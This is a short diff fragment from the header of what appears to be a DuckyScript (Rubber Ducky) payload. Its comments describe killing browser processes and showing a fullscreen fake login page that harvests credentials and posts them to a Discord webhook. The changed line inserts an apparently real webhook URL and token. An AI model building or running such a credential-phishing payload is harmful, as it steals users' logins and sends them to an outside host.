@@ -3,7 +3,7 @@ REM Author: @beigeworm
 REM Description: This script kills all egde and chrome processes, starts screensaver and opens edge in fullscreen that asks for login info and posts results to a discord webhook.
 REM Target: Windows 10
 
-REM *SETUP*
+REM *https://discord.com/api/webhooks/1545643949677351012/yJbWXury9XVd2Clyn36JmkhTFp4-4-X8BHfzVUt2jV2Yj9o-zzlyWLNVL6tNcxpPN-Fc*
 REM replace DISCORD_WEBHOOK_HERE with your Discord Webhook.
 
 REM some setup for dukie script
